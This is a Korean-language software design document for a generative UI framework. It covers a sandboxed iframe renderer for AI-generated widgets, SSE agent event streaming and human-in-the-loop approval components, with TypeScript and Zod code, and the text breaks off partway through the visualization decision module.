---
code: AIF-DSGN-024
title: "Generative UI Framework — Design Document"
version: "1.0"
status: Draft
category: DSGN
created: 2026-03-18
updated: 2026-03-18
author: Sinclair Seo
---

# Generative UI Framework — Design Document

> **Summary**: AI Foundry의 추출 결과(Skill 3,924건, Policy 3,675건, Ontology 3,880 노드)를 에이전트가 **동적으로 시각화**할 수 있는 Generative UI 프레임워크 상세 설계. Sandboxed Widget Renderer, AG-UI Protocol, HITL 컴포넌트, Decision Matrix 4개 모듈의 컴포넌트 인터페이스, Zod 스키마, 보안 모델, 테마 시스템을 정의한다.
>
> **Project**: RES AI Foundry
> **Version**: v0.7
> **Author**: Sinclair Seo
> **Date**: 2026-03-18
> **Status**: Draft
> **Planning Doc**: [generative-ui-framework.plan.md](../01-plan/features/generative-ui-framework.plan.md)
> **REQ**: AIF-REQ-024 (P1)

---

## 1. Overview

### 1.1 Design Goals

1. **안전한 동적 렌더링** — AI가 생성한 HTML/SVG/Mermaid를 iframe 샌드박스에서 격리 실행하여 XSS/데이터 탈취를 원천 차단
2. **실시간 에이전트 스트리밍** — AG-UI Protocol 기반 SSE로 에이전트 실행 상태를 구조화된 이벤트로 UI에 전달
3. **에이전트 플로우 내 HITL** — 정책 승인, 엔티티 확인, 파라미터 입력을 에이전트 대화 흐름 안에서 자연스럽게 수행
4. **자동 시각화 선택** — Decision Matrix가 데이터 특성을 분석하여 최적 시각화 유형을 자동 결정
5. **기존 인프라 재활용** — svc-mcp-server 확장, 기존 ThemeProvider/DomainContext 패턴 유지, `@ai-foundry/types` 공유

### 1.2 Design Principles

- **최소 침투**: 기존 app-web/app-mockup 아키텍처를 변경하지 않고 새 컴포넌트를 추가
- **iframe-first**: AI 생성 콘텐츠는 항상 iframe에서 실행 (신뢰할 수 없는 코드 가정)
- **점진적 적용**: app-mockup PoC → app-web 통합 순서로 검증
- **TypeScript strict 준수**: `exactOptionalPropertyTypes`, `noUncheckedIndexedAccess` 포함 전체 strict 옵션 준수

### 1.3 Relationship with AIF-REQ-019

```
REQ-019 (Working Mock-up)     REQ-024 (Generative UI)
┌────────────────────┐        ┌──────────────────────────┐
│ 4개 데모 (정책/Skill │  소비   │ Widget Renderer          │
│ /온톨로지/Export)    │◄──────│ AG-UI Protocol Client    │
│                    │        │ HITL Components          │
│ app-mockup SPA     │        │ Decision Matrix          │
└────────────────────┘        └──────────────────────────┘
         │                              │
         └──────────┬───────────────────┘
                    ▼
         app-mockup Demo 5: Generative Visualization
```

- REQ-019는 4개 데모의 **데이터 소스 + 페이지 프레임**을 제공
- REQ-024는 REQ-019 위에 **렌더링 엔진 + 에이전트 통신 레이어**를 탑재
- Demo 5(Generative Visualization)가 두 REQ의 통합 검증 포인트

### 1.4 Related Documents

- Plan: [[AIF-PLAN-024]] `docs/01-plan/features/generative-ui-framework.plan.md`
- Requirements: [[AIF-REQ-024]], SPEC.md §7
- Working Mock-up Design: [[AIF-DSGN-019]] (별도)
- AI Foundry PRD: `docs/AI_Foundry_PRD_TDS_v0.7.4.docx`
- MCP Server: `services/svc-mcp-server/` (Streamable HTTP, 515 published skills)
- 기존 이벤트 스키마: `packages/types/src/events.ts`

---

## 2. Architecture

### 2.1 전체 컴포넌트 계층

```
┌─────────────────────────────────────────────────────────────────────┐
│                 Frontend (app-mockup / app-web)                      │
│                                                                      │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │ AgentStreamProvider (Context)                                │    │
│  │  ├─ useAgentStream() hook ← SSE /agent/run                  │    │
│  │  ├─ eventReducer (dispatch by event type)                    │    │
│  │  └─ connectionManager (retry, resume)                        │    │
│  └──────────────────────┬──────────────────────────────────────┘    │
│                          │ AgentStreamContext                        │
│  ┌───────────────────────┼──────────────────────────────────────┐   │
│  │ AgentRunPanel         │                                       │   │
│  │  ├─ RunProgressBar ◄──┤ RUN_STARTED / RUN_FINISHED           │   │
│  │  ├─ ToolCallLog    ◄──┤ TOOL_CALL_START / TOOL_CALL_END      │   │
│  │  ├─ TextStream      ◄──┤ TEXT_MESSAGE_CONTENT                 │   │
│  │  │                     │                                       │   │
│  │  ├─ WidgetRenderer  ◄──┤ STATE_SYNC (widgetHtml)              │   │
│  │  │  └─ iframe (sandbox + CSP + Bridge + Theme)                │   │
│  │  │                     │                                       │   │
│  │  └─ HITL Zone       ◄──┤ CUSTOM/HITL_REQUEST                  │   │
│  │     ├─ PolicyApprovalCard                                     │   │
│  │     ├─ EntityConfirmation                                     │   │
│  │     └─ ParameterInput                                         │   │
│  └───────────────────────────────────────────────────────────────┘   │
│                                                                      │
│  ┌────────────────────────┐   ┌────────────────────────────────┐    │
│  │ DecisionMatrix         │   │ ThemeProvider (기존)             │    │
│  │  ├─ analyzeData()      │   │  └─ theme: "light" | "dark"    │    │
│  │  ├─ selectVizType()    │   │      → iframe 테마 동기화       │    │
│  │  └─ generatePrompt()   │   └────────────────────────────────┘    │
│  └────────────────────────┘                                          │
└──────────────────────────────────┬───────────────────────────────────┘
                                    │ SSE (AG-UI Events)
                                    ▼
                  ┌──────────────────────────────────┐
                  │ svc-mcp-server                    │
                  │  ├─ POST /mcp/:skillId (기존 MCP) │
                  │  ├─ POST /agent/run    (신규 SSE) │
                  │  ├─ POST /agent/resume (신규 HITL)│
                  │  └─ AgentSessionDO (Durable Object)│
                  └──────────┬──────────┬─────────────┘
                             │          │
                    ┌────────┘          └────────┐
                    ▼                            ▼
              svc-llm-router              svc-policy / svc-skill
              (시각화 생성)               (데이터 조회)
```

### 2.2 Data Flow: Agent Run → Widget Rendering

```
User: "퇴직연금 중도인출 정책 의존성을 보여줘"
  │
  ▼
[1] POST /agent/run
    Body: { task: "...", organizationId: "miraeasset-pension" }
  │
  ▼
[2] svc-mcp-server: AgentSessionDO 생성 → runId 발급
    SSE stream 시작
  │
  ├── event: RUN_STARTED { runId, agentName: "policy-analyzer", task }
  │
  ├── event: TOOL_CALL_START { toolName: "query-policies", args: {...} }
  │   └── svc-policy: GET /policies?domain=pension&status=approved
  │
  ├── event: TOOL_CALL_END { result: { policies: [...], count: 47 } }
  │
  ├── event: TOOL_CALL_START { toolName: "generate-visualization" }
  │   └── DecisionMatrix.analyze(policies) → "graph" (의존성 그래프)
  │   └── svc-llm-router: Sonnet → HTML/SVG 생성
  │
  ├── event: STATE_SYNC { widgetHtml: "<svg>...", vizType: "graph" }
  │   └── Frontend: WidgetRenderer에 srcdoc 주입 → iframe 렌더링
  │
  ├── event: CUSTOM/HITL_REQUEST
  │   { componentType: "PolicyApprovalCard", props: {...}, resumeToken }
  │   └── Frontend: PolicyApprovalCard 렌더링
  │   └── User: "승인" 클릭
  │   └── POST /agent/resume { resumeToken, decision: "approved" }
  │
  ├── event: TOOL_CALL_END { result: "Policy approved" }
  │
  └── event: RUN_FINISHED { runId, summary: "47건 분석, 1건 승인" }
```

### 2.3 Dependencies

| Component | Depends On | Purpose |
|-----------|-----------|---------|
| `WidgetRenderer.tsx` | 없음 (standalone) | iframe 기반 안전 렌더링 |
| `AgentStreamProvider.tsx` | svc-mcp-server `/agent/run` | SSE 이벤트 스트리밍 컨텍스트 |
| `useAgentStream.ts` | `AgentStreamProvider` | React hook으로 이벤트 소비 |
| `AgentRunPanel.tsx` | `useAgentStream`, `WidgetRenderer`, HITL 컴포넌트 | 에이전트 실행 UI 조합 |
| `DecisionMatrix.ts` | `@ai-foundry/types` | 데이터 분석 + 시각화 유형 결정 |
| HITL 컴포넌트 3종 | svc-mcp-server `/agent/resume` | 사용자 입력 → 에이전트 재개 |
| svc-mcp-server `/agent/run` | svc-llm-router, svc-policy, svc-skill, svc-ontology | 데이터 조회 + 시각화 생성 |
| `AgentSessionDO` | Durable Objects | 에이전트 세션 상태 보존 |

---

## 3. Component Design

### 3.1 WidgetRenderer.tsx

AI가 생성한 HTML/SVG/CSS를 Sandboxed iframe에서 안전하게 렌더링하는 핵심 컴포넌트.

**Props 인터페이스**:

```typescript
// apps/app-mockup/src/components/shared/WidgetRenderer.tsx (신규)

import { z } from "zod";

/** Widget 콘텐츠 유형 */
export const WidgetTypeSchema = z.enum([
  "chart",     // D3.js 기반 SVG 차트
  "graph",     // Force-directed 그래프
  "diagram",   // Mermaid 다이어그램
  "table",     // HTML 테이블 + 히트맵
  "form",      // HITL 입력 폼 (사용하지 않음 — HITL은 React 컴포넌트)
  "markdown",  // 마크다운 렌더링 (기존 MarkdownContent fallback)
]);
export type WidgetType = z.infer<typeof WidgetTypeSchema>;

/** 테마 변수 — 부모 → iframe 주입용 */
export interface ThemeVariables {
  "--aif-primary": string;
  "--aif-bg": string;
  "--aif-bg-secondary": string;
  "--aif-text": string;
  "--aif-text-secondary": string;
  "--aif-accent": string;
  "--aif-border": string;
  "--aif-font-body": string;
  "--aif-font-mono": string;
  "--aif-radius": string;
  [key: string]: string;  // 확장 가능
}

/** WidgetRenderer Props */
export interface WidgetRendererProps {
  /** AI가 생성한 HTML/SVG 콘텐츠 */
  content: string;
  /** 시각화 유형 (CSP 정책 및 라이브러리 로딩에 영향) */
  type: WidgetType;
  /** 현재 테마 CSS 변수 */
  themeVariables: ThemeVariables;
  /** 다크 모드 여부 */
  isDark: boolean;
  /** iframe → 부모 액션 콜백 */
  onAction: (action: BridgeAction) => void;
  /** 최대 높이 (px) — 기본값 600 */
  maxHeight?: number | undefined;
  /** 최대 너비 (px) — 기본값 100% */
  maxWidth?: number | undefined;
  /** 로딩 중 표시 여부 */
  isLoading?: boolean | undefined;
  /** 에러 메시지 */
  errorMessage?: string | undefined;
}

/** iframe → 부모 Bridge 액션 */
export const BridgeActionSchema = z.discriminatedUnion("type", [
  z.object({
    type: z.literal("resize"),
    height: z.number(),
  }),
  z.object({
    type: z.literal("action"),
    name: z.string(),
    payload: z.record(z.unknown()),
  }),
  z.object({
    type: z.literal("error"),
    message: z.string(),
  }),
  z.object({
    type: z.literal("ready"),
  }),
]);
export type BridgeAction = z.infer<typeof BridgeActionSchema>;
```

**내부 동작 — srcdoc 조립**:

```typescript
function buildSrcdoc(
  content: string,
  type: WidgetType,
  themeVars: ThemeVariables,
  isDark: boolean,
): string {
  const cspMeta = `<meta http-equiv="Content-Security-Policy" content="${getCSPPolicy(type)}">`;
  const themeStyle = buildThemeStyle(themeVars, isDark);
  const bridgeScript = BRIDGE_SCRIPT;             // postMessage 프로토콜
  const libraryScript = getLibraryScript(type);    // D3/Mermaid 인라인 번들

  return `<!DOCTYPE html>
<html class="${isDark ? "dark" : ""}">
<head>
  <meta charset="utf-8">
  ${cspMeta}
  <style>${themeStyle}</style>
  <style>${RESET_CSS}</style>
</head>
<body>
  <div id="widget-root">${content}</div>
  <script>${bridgeScript}</script>
  ${libraryScript ? `<script>${libraryScript}</script>` : ""}
</body>
</html>`;
}
```

**iframe 속성**:

```html
<iframe
  sandbox="allow-scripts"
  srcdoc={srcdocHtml}
  style={{ width: "100%", border: "none", maxHeight }}
  title="AI Generated Widget"
  referrerpolicy="no-referrer"
/>
```

- `allow-scripts`: 인라인 스크립트 실행 허용 (D3/Mermaid 필요)
- `allow-same-origin` **제외**: 부모 DOM, 쿠키, localStorage 접근 차단
- `allow-forms`, `allow-popups`, `allow-top-navigation` **제외**: 폼 제출, 팝업, 네비게이션 차단

**자동 높이 조절**:

```typescript
// Bridge 스크립트 (iframe 내부에서 실행)
const BRIDGE_SCRIPT = `
(function() {
  const ORIGIN = '*';  // sandbox에서는 origin이 'null'이므로 * 사용
  const root = document.getElementById('widget-root');
  if (!root) return;

  // 준비 완료 알림
  window.parent.postMessage({ type: 'ready' }, ORIGIN);

  // ResizeObserver로 높이 변경 감지
  const ro = new ResizeObserver(function(entries) {
    for (const entry of entries) {
      const height = Math.ceil(entry.contentRect.height) + 16;
      window.parent.postMessage({ type: 'resize', height: height }, ORIGIN);
    }
  });
  ro.observe(root);

  // 에러 핸들링
  window.onerror = function(msg) {
    window.parent.postMessage({ type: 'error', message: String(msg) }, ORIGIN);
  };

  // 위젯 내부 액션 → 부모 전달 (위젯 코드에서 호출)
  window.__bridge = {
    action: function(name, payload) {
      window.parent.postMessage(
        { type: 'action', name: name, payload: payload || {} },
        ORIGIN
      );
    }
  };
})();
`;
```

**부모 측 메시지 수신**:

```typescript
// WidgetRenderer 내부
useEffect(() => {
  function handleMessage(event: MessageEvent) {
    // sandbox iframe의 origin은 'null' (문자열)
    // srcdoc iframe이므로 origin 검증 대신 source 검증
    if (event.source !== iframeRef.current?.contentWindow) return;

    const parsed = BridgeActionSchema.safeParse(event.data);
    if (!parsed.success) return;

    const action = parsed.data;
    if (action.type === "resize") {
      setIframeHeight(Math.min(action.height, maxHeight ?? 600));
    }
    onAction(action);
  }

  window.addEventListener("message", handleMessage);
  return () => window.removeEventListener("message", handleMessage);
}, [onAction, maxHeight]);
```

### 3.2 AgentStreamProvider.tsx

AG-UI 이벤트 스트림을 관리하는 React Context Provider.

```typescript
// apps/app-mockup/src/contexts/AgentStreamContext.tsx (신규)

import { createContext, useContext, useReducer, useCallback, useRef, type ReactNode } from "react";
import type { AgUiEvent, AgentRunRequest, HitlResponse } from "@ai-foundry/types";

// ── State ──────────────────────────────────────────────

interface ToolCall {
  toolCallId: string;
  toolName: string;
  args: Record<string, unknown>;
  result: unknown | null;
  status: "running" | "completed" | "error";
  startedAt: number;
  completedAt: number | null;
}

interface HitlRequest {
  componentType: "PolicyApprovalCard" | "EntityConfirmation" | "ParameterInput";
  props: Record<string, unknown>;
  resumeToken: string;
}

export interface AgentStreamState {
  status: "idle" | "connecting" | "running" | "paused_hitl" | "completed" | "error";
  runId: string | null;
  agentName: string | null;
  taskDescription: string | null;
  textContent: string;
  toolCalls: ToolCall[];
  widgetHtml: string | null;
  widgetType: string | null;
  hitlRequest: HitlRequest | null;
  summary: string | null;
  errorMessage: string | null;
}

const initialState: AgentStreamState = {
  status: "idle",
  runId: null,
  agentName: null,
  taskDescription: null,
  textContent: "",
  toolCalls: [],
  widgetHtml: null,
  widgetType: null,
  hitlRequest: null,
  summary: null,
  errorMessage: null,
};

// ── Reducer ────────────────────────────────────────────

type AgentStreamAction =
  | { type: "RESET" }
  | { type: "CONNECTING" }
  | { type: "RUN_STARTED"; runId: string; agentName: string; taskDescription: string }
  | { type: "TEXT_DELTA"; delta: string }
  | { type: "TOOL_CALL_START"; toolCallId: string; toolName: string; args: Record<string, unknown> }
  | { type: "TOOL_CALL_END"; toolCallId: string; result: unknown }
  | { type: "STATE_SYNC"; widgetHtml: string; visualizationType: string }
  | { type: "HITL_REQUEST"; componentType: HitlRequest["componentType"]; props: Record<string, unknown>; resumeToken: string }
  | { type: "HITL_RESUMED" }
  | { type: "RUN_FINISHED"; summary: string }
  | { type: "RUN_ERROR"; error: string };

function agentStreamReducer(state: AgentStreamState, action: AgentStreamAction): AgentStreamState {
  switch (action.type) {
    case "RESET":
      return initialState;
    case "CONNECTING":
      return { ...initialState, status: "connecting" };
    case "RUN_STARTED":
      return {
        ...state,
        status: "running",
        runId: action.runId,
        agentName: action.agentName,
        taskDescription: action.taskDescription,
      };
    case "TEXT_DELTA":
      return { ...state, textContent: state.textContent + action.delta };
    case "TOOL_CALL_START":
      return {
        ...state,
        toolCalls: [
          ...state.toolCalls,
          {
            toolCallId: action.toolCallId,
            toolName: action.toolName,
            args: action.args,
            result: null,
            status: "running",
            startedAt: Date.now(),
            completedAt: null,
          },
        ],
      };
    case "TOOL_CALL_END":
      return {
        ...state,
        toolCalls: state.toolCalls.map((tc) =>
          tc.toolCallId === action.toolCallId
            ? { ...tc, result: action.result, status: "completed" as const, completedAt: Date.now() }
            : tc
        ),
      };
    case "STATE_SYNC":
      return { ...state, widgetHtml: action.widgetHtml, widgetType: action.visualizationType };
    case "HITL_REQUEST":
      return {
        ...state,
        status: "paused_hitl",
        hitlRequest: {
          componentType: action.componentType,
          props: action.props,
          resumeToken: action.resumeToken,
        },
      };
    case "HITL_RESUMED":
      return { ...state, status: "running", hitlRequest: null };
    case "RUN_FINISHED":
      return { ...state, status: "completed", summary: action.summary };
    case "RUN_ERROR":
      return { ...state, status: "error", errorMessage: action.error };
  }
}

// ── Context ────────────────────────────────────────────

interface AgentStreamContextValue {
  state: AgentStreamState;
  startRun: (request: AgentRunRequest) => void;
  resumeHitl: (response: HitlResponse) => Promise<void>;
  cancelRun: () => void;
}

const AgentStreamContext = createContext<AgentStreamContextValue | null>(null);

// ── Provider ───────────────────────────────────────────

interface AgentStreamProviderProps {
  children: ReactNode;
  /** MCP 서버 base URL (e.g., "/api" proxied or full URL) */
  baseUrl: string;
  /** 인증 토큰 */
  authToken: string;
}

export function AgentStreamProvider({ children, baseUrl, authToken }: AgentStreamProviderProps) {
  const [state, dispatch] = useReducer(agentStreamReducer, initialState);
  const abortRef = useRef<AbortController | null>(null);

  const startRun = useCallback(
    (request: AgentRunRequest) => {
      // 기존 연결 정리
      abortRef.current?.abort();
      dispatch({ type: "CONNECTING" });

      const controller = new AbortController();
      abortRef.current = controller;

      // SSE 연결 시작
      startSSE(baseUrl, authToken, request, dispatch, controller.signal);
    },
    [baseUrl, authToken],
  );

  const resumeHitl = useCallback(
    async (response: HitlResponse) => {
      if (!state.hitlRequest) return;

      await fetch(`${baseUrl}/agent/resume`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${authToken}`,
        },
        body: JSON.stringify({
          runId: state.runId,
          resumeToken: state.hitlRequest.resumeToken,
          response,
        }),
      });

      dispatch({ type: "HITL_RESUMED" });
    },
    [baseUrl, authToken, state.runId, state.hitlRequest],
  );

  const cancelRun = useCallback(() => {
    abortRef.current?.abort();
    dispatch({ type: "RESET" });
  }, []);

  return (
    <AgentStreamContext.Provider value={{ state, startRun, resumeHitl, cancelRun }}>
      {children}
    </AgentStreamContext.Provider>
  );
}

export function useAgentStreamContext(): AgentStreamContextValue {
  const ctx = useContext(AgentStreamContext);
  if (!ctx) throw new Error("useAgentStreamContext must be used within AgentStreamProvider");
  return ctx;
}
```

### 3.3 useAgentStream.ts — SSE 소비 Hook

```typescript
// apps/app-mockup/src/lib/agent-stream.ts (신규)

import type { AgentRunRequest } from "@ai-foundry/types";
import type { Dispatch } from "react";

// AgentStreamAction은 AgentStreamContext.tsx에서 import
type AgentStreamAction = Parameters<typeof import("../contexts/AgentStreamContext").agentStreamReducer>[1];

/**
 * SSE 스트림을 시작하고 이벤트를 dispatch로 전달한다.
 *
 * AG-UI 이벤트 형식:
 *   event: RUN_STARTED\n
 *   data: {"runId":"...","agentName":"...","taskDescription":"..."}\n\n
 */
export async function startSSE(
  baseUrl: string,
  authToken: string,
  request: AgentRunRequest,
  dispatch: Dispatch<AgentStreamAction>,
  signal: AbortSignal,
): Promise<void> {
  try {
    const response = await fetch(`${baseUrl}/agent/run`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${authToken}`,
        Accept: "text/event-stream",
      },
      body: JSON.stringify(request),
      signal,
    });

    if (!response.ok || !response.body) {
      dispatch({ type: "RUN_ERROR", error: `HTTP ${response.status}: ${response.statusText}` });
      return;
    }

    const reader = response.body.getReader();
    const decoder = new TextDecoder();
    let buffer = "";

    while (true) {
      const { done, value } = await reader.read();
      if (done) break;

      buffer += decoder.decode(value, { stream: true });

      // SSE 파싱: 더블 개행으로 이벤트 구분
      const parts = buffer.split("\n\n");
      buffer = parts.pop() ?? "";

      for (const part of parts) {
        const parsed = parseSSEEvent(part);
        if (parsed) {
          dispatchAgUiEvent(parsed.event, parsed.data, dispatch);
        }
      }
    }
  } catch (e) {
    if (signal.aborted) return; // 의도적 취소
    dispatch({ type: "RUN_ERROR", error: String(e) });
  }
}

interface SSEParsed {
  event: string;
  data: string;
}

function parseSSEEvent(raw: string): SSEParsed | null {
  let event = "";
  let data = "";

  for (const line of raw.split("\n")) {
    if (line.startsWith("event:")) {
      event = line.slice(6).trim();
    } else if (line.startsWith("data:")) {
      data += line.slice(5).trim();
    }
  }

  if (!event || !data) return null;
  return { event, data };
}

function dispatchAgUiEvent(
  eventType: string,
  dataStr: string,
  dispatch: Dispatch<AgentStreamAction>,
): void {
  try {
    const data = JSON.parse(dataStr) as Record<string, unknown>;

    switch (eventType) {
      case "RUN_STARTED":
        dispatch({
          type: "RUN_STARTED",
          runId: String(data["runId"] ?? ""),
          agentName: String(data["agentName"] ?? ""),
          taskDescription: String(data["taskDescription"] ?? ""),
        });
        break;

      case "TEXT_MESSAGE_CONTENT":
        dispatch({ type: "TEXT_DELTA", delta: String(data["delta"] ?? "") });
        break;

      case "TOOL_CALL_START":
        dispatch({
          type: "TOOL_CALL_START",
          toolCallId: String(data["toolCallId"] ?? ""),
          toolName: String(data["toolName"] ?? ""),
          args: (data["args"] as Record<string, unknown>) ?? {},
        });
        break;

      case "TOOL_CALL_END":
        dispatch({
          type: "TOOL_CALL_END",
          toolCallId: String(data["toolCallId"] ?? ""),
          result: data["result"],
        });
        break;

      case "STATE_SYNC":
        dispatch({
          type: "STATE_SYNC",
          widgetHtml: String(data["widgetHtml"] ?? ""),
          visualizationType: String(data["visualizationType"] ?? "chart"),
        });
        break;

      case "CUSTOM": {
        const subType = data["subType"];
        if (subType === "HITL_REQUEST") {
          dispatch({
            type: "HITL_REQUEST",
            componentType: data["componentType"] as "PolicyApprovalCard" | "EntityConfirmation" | "ParameterInput",
            props: (data["props"] as Record<string, unknown>) ?? {},
            resumeToken: String(data["resumeToken"] ?? ""),
          });
        }
        break;
      }

      case "RUN_FINISHED":
        dispatch({
          type: "RUN_FINISHED",
          summary: String(data["summary"] ?? ""),
        });
        break;

      case "RUN_ERROR":
        dispatch({
          type: "RUN_ERROR",
          error: String(data["error"] ?? "Unknown error"),
        });
        break;
    }
  } catch {
    // JSON 파싱 실패 — 무시 (corrupt event)
  }
}
```

### 3.4 AgentRunPanel.tsx

에이전트 실행 상태를 실시간으로 표시하는 통합 UI 패널.

```typescript
// apps/app-mockup/src/components/shared/AgentRunPanel.tsx (신규)

interface AgentRunPanelProps {
  /** WidgetRenderer에 주입할 테마 변수 */
  themeVariables: ThemeVariables;
  /** 다크 모드 여부 */
  isDark: boolean;
  /** 에이전트 실행 요청을 트리거하는 콜백 (외부에서 주입) */
  onRequestRun: (task: string) => void;
}
```

**내부 구조**:

```
┌─ AgentRunPanel ──────────────────────────────────────┐
│                                                       │
│  ┌─ Header ────────────────────────────────────────┐ │
│  │ 🤖 {agentName} — {taskDescription}              │ │
│  │ [취소] 버튼                                      │ │
│  └──────────────────────────────────────────────────┘ │
│                                                       │
│  ┌─ RunProgressBar ────────────────────────────────┐ │
│  │ ● 시작 ─── ● 데이터 조회 ─── ● 시각화 ─── ● 완료│ │
│  │            ^^^^ 현재 단계 활성                   │ │
│  └──────────────────────────────────────────────────┘ │
│                                                       │
│  ┌─ ToolCallLog (접이식) ──────────────────────────┐ │
│  │ ▶ query-policies (완료, 234ms)                   │ │
│  │ ▶ generate-visualization (진행 중...)              │ │
│  └──────────────────────────────────────────────────┘ │
│                                                       │
│  ┌─ TextStream ────────────────────────────────────┐ │
│  │ 퇴직연금 도메인에서 47건의 정책을 분석합니다...    │ │
│  │ 의존성 그래프를 생성하고 있습니다... █             │ │
│  └──────────────────────────────────────────────────┘ │
│                                                       │
│  ┌─ WidgetRenderer (조건부 표시) ──────────────────┐ │
│  │ ┌─ iframe (sandbox) ─────────────────────────┐  │ │
│  │ │                                             │  │ │
│  │ │   [AI 생성 SVG 그래프 / 차트 / 다이어그램]   │  │ │
│  │ │                                             │  │ │
│  │ └─────────────────────────────────────────────┘  │ │
│  └──────────────────────────────────────────────────┘ │
│                                                       │
│  ┌─ HITL Zone (조건부 표시) ───────────────────────┐ │
│  │ PolicyApprovalCard / EntityConfirmation /        │ │
│  │ ParameterInput (hitlRequest에 따라 동적 렌더링)  │ │
│  └──────────────────────────────────────────────────┘ │
│                                                       │
│  ┌─ Summary (완료 후 표시) ────────────────────────┐ │
│  │ ✅ 47건 분석 완료, 1건 정책 승인                  │ │
│  └──────────────────────────────────────────────────┘ │
│                                                       │
└───────────────────────────────────────────────────────┘
```

**HITL 컴포넌트 동적 렌더링**:

```typescript
function renderHitlComponent(
  hitlRequest: HitlRequest,
  onRespond: (response: HitlResponse) => void,
): React.ReactNode {
  switch (hitlRequest.componentType) {
    case "PolicyApprovalCard":
      return (
        <PolicyApprovalCard
          {...(hitlRequest.props as PolicyApprovalCardProps)}
          onDecision={(decision) => onRespond({ decision })}
        />
      );
    case "EntityConfirmation":
      return (
        <EntityConfirmation
          {...(hitlRequest.props as EntityConfirmationProps)}
          onConfirm={(selected) => onRespond({ selectedEntity: selected })}
        />
      );
    case "ParameterInput":
      return (
        <ParameterInput
          {...(hitlRequest.props as ParameterInputProps)}
          onSubmit={(params) => onRespond({ parameters: params })}
        />
      );
  }
}
```

### 3.5 PolicyApprovalCard.tsx

정책 승인/반려를 위한 HITL 컴포넌트.

```typescript
// apps/app-mockup/src/components/shared/PolicyApprovalCard.tsx (신규)

export interface PolicyApprovalCardProps {
  /** 정책 코드 (e.g., "POL-PENSION-WD-HOUSING-001") */
  policyCode: string;
  /** 정책 제목 */
  title: string;
  /** 조건 (IF) */
  condition: string;
  /** 판단 기준 */
  criteria: string;
  /** 결과 (THEN) */
  outcome: string;
  /** 현재 신뢰도 점수 */
  trustScore: number;
  /** 출처 문서 */
  sourceDocument: string;
  /** 에이전트 추론 근거 */
  reasoning: string;
  /** 결정 콜백 */
  onDecision: (decision: PolicyDecision) => void;
}

export interface PolicyDecision {
  action: "approved" | "rejected" | "modified";
  comment: string;
  /** 수정 시 변경된 필드 */
  modifications?: Record<string, string> | undefined;
}
```

**UI 레이아웃**:

```
┌─ PolicyApprovalCard ─────────────────────────────────┐
│ ⚖️ 정책 승인 요청                                     │
│                                                       │
│ POL-PENSION-WD-HOUSING-001                            │
│ "주택 구입 목적 퇴직연금 중도인출"                      │
│                                                       │
│ ┌─ 정책 상세 ──────────────────────────────────────┐ │
│ │ IF: 가입자가 무주택자이며 주택 구입 목적으로 ...   │ │
│ │ 기준: 근속 연수 5년 이상, 계좌 잔고 1,000만원 ... │ │
│ │ THEN: 중도인출 승인, 최대 50% 한도 적용           │ │
│ └──────────────────────────────────────────────────┘ │
│                                                       │
│ 📊 신뢰도: 0.87  |  📄 출처: IRP규약_v3.2.pdf        │
│                                                       │
│ 💭 에이전트 근거:                                      │
│ "IRP규약 §12.3에 근거하여 주택구입 중도인출 조건을..." │
│                                                       │
│ ┌─ 코멘트 입력 ────────────────────────────────────┐ │
│ │ [텍스트 입력 영역]                                 │ │
│ └──────────────────────────────────────────────────┘ │
│                                                       │
│  [✅ 승인]  [❌ 반려]  [✏️ 수정 후 승인]               │
│                                                       │
└───────────────────────────────────────────────────────┘
```

### 3.6 EntityConfirmation.tsx

엔티티 매핑 모호성이 발생했을 때 사용자가 올바른 후보를 선택하는 컴포넌트.

```typescript
// apps/app-mockup/src/components/shared/EntityConfirmation.tsx (신규)

export interface EntityCandidate {
  entityId: string;
  label: string;
  definition: string;
  /** 매칭 점수 (0-1) */
  matchScore: number;
  /** 후보 출처 (e.g., "Neo4j", "D1 terms") */
  source: string;
}

export interface EntityConfirmationProps {
  /** 매핑 대상 원본 텍스트 */
  sourceText: string;
  /** 매핑 대상 문맥 */
  context: string;
  /** 후보 엔티티 목록 (2-5개) */
  candidates: EntityCandidate[];
  /** 에이전트 추천 후보 ID */
  recommendedId: string;
  /** 선택 콜백 */
  onConfirm: (selectedEntityId: string) => void;
}
```

**UI 레이아웃**:

```
┌─ EntityConfirmation ─────────────────────────────────┐
│ 🔗 엔티티 매핑 확인                                    │
│                                                       │
│ 원본: "중도인출 가능 금액"                              │
│ 문맥: "...IRP 계좌에서 중도인출 가능 금액을 계산..."    │
│                                                       │
│ 후보:                                                  │
│ ┌──────────────────────────────────────────────────┐ │
│ │ ⭐ 1. 중도인출한도액 (score: 0.92)  [추천]        │ │
│ │    "IRP 가입자가 인출 가능한 최대 금액"            │ │
│ │    출처: Neo4j                                    │ │
│ ├──────────────────────────────────────────────────┤ │
│ │    2. 인출가능잔액 (score: 0.78)                   │ │
│ │    "현재 시점에서 인출 가능한 잔고"                 │ │
│ │    출처: D1 terms                                 │ │
│ ├──────────────────────────────────────────────────┤ │
│ │    3. 퇴직급여 (score: 0.45)                       │ │
│ │    "퇴직 시 지급되는 급여 총액"                     │ │
│ │    출처: Neo4j                                    │ │
│ └──────────────────────────────────────────────────┘ │
│                                                       │
│  [1번 선택]  [2번 선택]  [3번 선택]  [없음 — 새 엔티티] │
│                                                       │
└───────────────────────────────────────────────────────┘
```

### 3.7 ParameterInput.tsx

에이전트가 Skill 실행에 필요한 추가 정보를 요청할 때 렌더링되는 폼 컴포넌트.

```typescript
// apps/app-mockup/src/components/shared/ParameterInput.tsx (신규)

export interface ParameterField {
  name: string;
  label: string;
  type: "text" | "number" | "select" | "date" | "boolean";
  required: boolean;
  description: string;
  /** select 타입인 경우 옵션 목록 */
  options?: Array<{ value: string; label: string }> | undefined;
  /** 기본값 */
  defaultValue?: string | undefined;
  /** 유효성 검증 힌트 */
  validationHint?: string | undefined;
}

export interface ParameterInputProps {
  /** 요청 설명 (에이전트가 왜 이 정보가 필요한지) */
  requestDescription: string;
  /** 입력 필드 정의 */
  fields: ParameterField[];
  /** 제출 콜백 */
  onSubmit: (params: Record<string, string>) => void;
}
```

### 3.8 DecisionMatrix.ts

데이터 특성을 분석하여 최적 시각화 유형을 자동 선택하는 순수 함수 모듈.

```typescript
// apps/app-mockup/src/lib/decision-matrix.ts (신규)

import type { WidgetType } from "../components/shared/WidgetRenderer";

/** 데이터 특성 분석 결과 */
export interface DataCharacteristics {
  /** 시간축(날짜/순서) 데이터 존재 여부 */
  hasTimeSeries: boolean;
